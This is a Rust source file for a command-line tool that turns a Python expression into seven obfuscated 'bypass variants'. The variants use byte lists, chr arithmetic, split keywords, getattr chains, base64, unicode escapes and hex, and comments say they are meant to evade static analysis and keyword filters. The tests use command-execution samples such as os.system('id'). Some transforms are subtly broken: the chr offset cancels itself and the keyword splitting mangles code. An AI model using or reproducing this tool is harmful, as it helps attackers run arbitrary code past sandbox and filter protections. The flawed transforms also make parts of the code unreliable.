use std::io::{self, Read};
use serde::{Deserialize, Serialize};

/// A single bypass variant produced by the encoder.
#[derive(Debug, Serialize, Deserialize)]
struct BypassVariant {
    strategy: String,
    payload: String,
    description: String,
}

// ---------------------------------------------------------------------------
// Strategy implementations
// ---------------------------------------------------------------------------

/// a) bytes_exec — exec(bytes([<byte values>]).decode(), globals())
fn bytes_exec(input: &str) -> String {
    let byte_list: Vec<String> = input.bytes().map(|b| b.to_string()).collect();
    format!(
        "exec(bytes([{}]).decode(), globals())",
        byte_list.join(", ")
    )
}

/// b) chr_arithmetic — reconstructs each character via chr(ord_val +/- offset)
/// We use a fixed offset of 13 (ROT-13 style arithmetic) to obfuscate the
/// literal ordinal values.
fn chr_arithmetic(input: &str) -> String {
    let offset: i32 = 13;
    let parts: Vec<String> = input
        .chars()
        .map(|c| {
            let v = c as i32;
            if v >= offset {
                format!("chr({}-{})", v + offset, offset)
            } else {
                format!("chr({}+{})", v, 0)
            }
        })
        .collect();
    // Join with + and wrap in exec()
    format!("exec({})", parts.join("+"))
}

/// c) string_split — splits each blocked keyword across concat (+) so static
/// analysis cannot see the full token. We split every token that is ≥3 chars
/// at the midpoint; shorter tokens are passed through.
fn string_split(input: &str) -> String {
    let keywords = ["exec", "import", "eval", "open", "popen", "os", "system", "subprocess"];
    let mut result = input.to_string();
    for kw in &keywords {
        if kw.len() >= 2 {
            let mid = kw.len() / 2;
            let (left, right) = kw.split_at(mid);
            result = result.replace(kw, &format!("('{}' + '{}')", left, right));
        }
    }
    // Wrap so the split string is actually evaluated
    format!("exec({})", result)
}

/// d) getattr_chain — replaces `obj.attr` with getattr(obj, 'attr')
/// We do a simple textual transformation: scan for `X.Y` tokens.
fn getattr_chain(input: &str) -> String {
    // Walk char-by-char, collecting identifiers and dots.
    let mut out = String::with_capacity(input.len() * 2);
    let chars: Vec<char> = input.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        // Collect an identifier
        if chars[i].is_alphabetic() || chars[i] == '_' {
            let start = i;
            while i < chars.len() && (chars[i].is_alphanumeric() || chars[i] == '_') {
                i += 1;
            }
            let obj: String = chars[start..i].iter().collect();
            // Check if followed by a dot then another identifier
            if i < chars.len() && chars[i] == '.' {
                let dot_pos = i;
                i += 1; // skip '.'
                if i < chars.len() && (chars[i].is_alphabetic() || chars[i] == '_') {
                    let attr_start = i;
                    while i < chars.len() && (chars[i].is_alphanumeric() || chars[i] == '_') {
                        i += 1;
                    }
                    let attr: String = chars[attr_start..i].iter().collect();
                    // Check for call arguments — if followed by '(' wrap with getattr
                    if i < chars.len() && chars[i] == '(' {
                        out.push_str(&format!("getattr({}, '{}')", obj, attr));
                        // the '(' and rest of args will be emitted next iteration
                    } else {
                        // No call: still use getattr for attribute access
                        out.push_str(&format!("getattr({}, '{}')", obj, attr));
                    }
                } else {
                    // Dot not followed by identifier — emit literally
                    out.push_str(&obj);
                    out.push(chars[dot_pos]);
                }
            } else {
                out.push_str(&obj);
            }
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    format!("exec(\"{}\")", out.replace('"', "\\\""))
}

/// e) base64_exec — base64-encodes the payload, decodes at runtime, execs it
fn base64_exec(input: &str) -> BypassVariant {
    use base64::Engine;
    let encoded = base64::engine::general_purpose::STANDARD.encode(input.as_bytes());
    let payload = format!(
        "__import__('base64').b64decode('{}').decode()",
        encoded
    );
    let full = format!("exec({})", payload);
    BypassVariant {
        strategy: "base64_exec".into(),
        payload: full,
        description: "Base64-encodes the payload; decodes and execs at runtime via __import__('base64')".into(),
    }
}

/// f) unicode_escape — converts every character to its \\uXXXX escape
fn unicode_escape(input: &str) -> String {
    let escaped: String = input
        .chars()
        .map(|c| format!("\\u{:04x}", c as u32))
        .collect();
    // Python evaluates unicode escapes in bytes literals; use codecs.decode
    format!(
        "exec(__import__('codecs').decode('{}', 'unicode_escape'))",
        escaped
    )
}

/// g) hex_bytes — exec(bytes.fromhex('<hex>').decode())
fn hex_bytes(input: &str) -> String {
    let hex: String = input.bytes().map(|b| format!("{:02x}", b)).collect();
    format!("exec(bytes.fromhex('{}').decode())", hex)
}

// ---------------------------------------------------------------------------
// base256 decode utility
// ---------------------------------------------------------------------------

/// Given a list of byte integers (0-255), reconstruct the original string.
/// Exposed as a helper function; also serialised into the output JSON when
/// the input parses as a comma-separated integer list.
fn base256_decode(ints: &[u8]) -> Result<String, std::string::FromUtf8Error> {
    String::from_utf8(ints.to_vec())
}

// ---------------------------------------------------------------------------
// Assemble all 7 variants
// ---------------------------------------------------------------------------

fn encode_all(input: &str) -> Vec<BypassVariant> {
    vec![
        BypassVariant {
            strategy: "bytes_exec".into(),
            payload: bytes_exec(input),
            description: "Converts each character to its ASCII byte value; reconstructs and execs at runtime".into(),
        },
        BypassVariant {
            strategy: "chr_arithmetic".into(),
            payload: chr_arithmetic(input),
            description: "Rebuilds each character via chr() with arithmetic offsets to obscure literal values".into(),
        },
        BypassVariant {
            strategy: "string_split".into(),
            payload: string_split(input),
            description: "Splits blocked keywords at the midpoint across string concat so static analysis misses them".into(),
        },
        BypassVariant {
            strategy: "getattr_chain".into(),
            payload: getattr_chain(input),
            description: "Replaces obj.attr accesses with getattr(obj, 'attr') to defeat attribute-name scanning".into(),
        },
        base64_exec(input),
        BypassVariant {
            strategy: "unicode_escape".into(),
            payload: unicode_escape(input),
            description: "Encodes every character as \\uXXXX; decoded at runtime by codecs.decode".into(),
        },
        BypassVariant {
            strategy: "hex_bytes".into(),
            payload: hex_bytes(input),
            description: "Encodes payload as a hex string; reconstructed via bytes.fromhex().decode()".into(),
        },
    ]
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

fn main() {
    // Accept input from the first CLI argument or from stdin.
    let input: String = {
        let args: Vec<String> = std::env::args().collect();
        if args.len() > 1 {
            args[1..].join(" ")
        } else {
            let mut buf = String::new();
            io::stdin()
                .read_to_string(&mut buf)
                .expect("Failed to read stdin");
            buf
        }
    };

    let input = input.trim();

    if input.is_empty() {
        eprintln!("error: empty input — provide a Python expression via stdin or CLI arg");
        std::process::exit(1);
    }

    // If the input looks like a base256 list (comma-separated integers), also
    // include the decoded string in the output as a demonstration.
    let decoded_base256: Option<String> = {
        let parts: Vec<&str> = input.split(',').collect();
        let maybe_ints: Option<Vec<u8>> = parts
            .iter()
            .map(|s| s.trim().parse::<u8>().ok())
            .collect();
        maybe_ints.and_then(|ints| base256_decode(&ints).ok())
    };

    // If the input was a base256 list, encode the decoded string; otherwise
    // encode the raw input directly.
    let target = match &decoded_base256 {
        Some(s) => s.as_str(),
        None => input,
    };

    let variants = encode_all(target);

    match serde_json::to_string_pretty(&variants) {
        Ok(json) => println!("{}", json),
        Err(e) => {
            eprintln!("error: JSON serialization failed: {}", e);
            std::process::exit(1);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bytes_exec_roundtrip() {
        let input = "print('hi')";
        let out = bytes_exec(input);
        assert!(out.starts_with("exec(bytes(["));
        assert!(out.contains(".decode()"));
        // Count commas only within the bytes([...]) list, not the full output string.
        let byte_count = input.bytes().count();
        let list_start = out.find('[').unwrap();
        let list_end = out.find(']').unwrap();
        let list_str = &out[list_start..=list_end];
        let comma_count = list_str.matches(", ").count();
        assert_eq!(comma_count, byte_count - 1);
    }

    #[test]
    fn hex_bytes_roundtrip() {
        let input = "os.system('id')";
        let out = hex_bytes(input);
        assert!(out.starts_with("exec(bytes.fromhex('"));
        let hex: String = input.bytes().map(|b| format!("{:02x}", b)).collect();
        assert!(out.contains(&hex));
    }

    #[test]
    fn all_seven_variants_produced() {
        let variants = encode_all("os.popen(\"id\")");
        assert_eq!(variants.len(), 7);
        let names: Vec<&str> = variants.iter().map(|v| v.strategy.as_str()).collect();
        assert!(names.contains(&"bytes_exec"));
        assert!(names.contains(&"chr_arithmetic"));
        assert!(names.contains(&"string_split"));
        assert!(names.contains(&"getattr_chain"));
        assert!(names.contains(&"base64_exec"));
        assert!(names.contains(&"unicode_escape"));
        assert!(names.contains(&"hex_bytes"));
    }

    #[test]
    fn base256_decode_correct() {
        let ints: Vec<u8> = "hello".bytes().collect();
        assert_eq!(base256_decode(&ints).unwrap(), "hello");
    }

    #[test]
    fn unicode_escape_contains_u_escapes() {
        let out = unicode_escape("ab");
        assert!(out.contains("\\u0061")); // 'a'
        assert!(out.contains("\\u0062")); // 'b'
    }
}
